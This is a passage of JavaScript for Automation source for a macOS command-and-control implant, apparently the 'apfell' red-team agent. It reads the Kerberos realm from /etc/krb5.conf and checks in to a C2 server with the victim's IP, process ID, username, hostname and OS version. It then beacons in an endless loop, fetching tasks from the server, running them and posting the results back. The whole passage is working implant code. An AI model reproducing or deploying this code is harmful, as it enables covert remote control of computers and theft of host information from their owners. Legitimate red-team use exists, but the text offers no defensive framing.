        C2.commands = Object.keys(commands_dict);
        let cmd_list = [];
        for(let i = 0; i < parsed_params['commands'].length; i++){
            cmd_list.push({"action": "add", "cmd": parsed_params['commands'][i]})
        }
        return {"user_output": "Loaded " + parsed_params['commands'], "commands": cmd_list, "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};


//console.log("about to load commands");
var commands_dict = exports;
var jsimport = "";

//-------------GET IP AND CHECKIN ----------------------------------
if( $.NSDate.date.compare(C2.kill_date) === $.NSOrderedDescending ){
  $.NSApplication.sharedApplication.terminate(this);
}
let ip_found = false;
C2.commands =  Object.keys(commands_dict);
let domain = "";
if(does_file_exist("/etc/krb5.conf")){
    let contents = $.NSString.stringWithContentsOfFileEncodingError("/etc/krb5.conf", $.NSUTF8StringEncoding, $.nil).js;
    contents = contents.split("\n");
    for(let j = 0; j < contents.length; j++){
        if(contents[j].includes("default_realm")){
            domain = contents[j].split("=")[1].trim();
        }
    }
}
for(let i=0; i < apfell.ip.length; i++){
	let ip = apfell.ip[i];
	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
		ip_found = true;
		break;
	}
}
if(!ip_found){
    C2.checkin("127.0.0.1",apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
}
//---------------------------MAIN LOOP ----------------------------------------
function sleepWakeUp(){
    while(true){
        $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
        let output = "";
        let task = C2.getTasking();
        //console.log(JSON.stringify(task));
        let command = "";
        try{
        	//console.log(JSON.stringify(task));
        	if(task.length === 0){
        		continue;
        	}
        	task = task[0];
        	//console.log(JSON.stringify(task));
            command = task["command"];
            try{
                output = commands_dict[command](task, command, task['parameters']);
            }
            catch(error){
                if(error.toString().includes("commands_dict[command] is not a function")){
                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
                }
                else{
                    output = {"user_output": error.toString(), "status": "error", "completed": true};
                }
            }
            C2.postResponse(task, output);
        }
        catch(error){
            C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
        }
        //task["command"] = "none"; //reset just in case something goes weird
    }
}
sleepWakeUp();
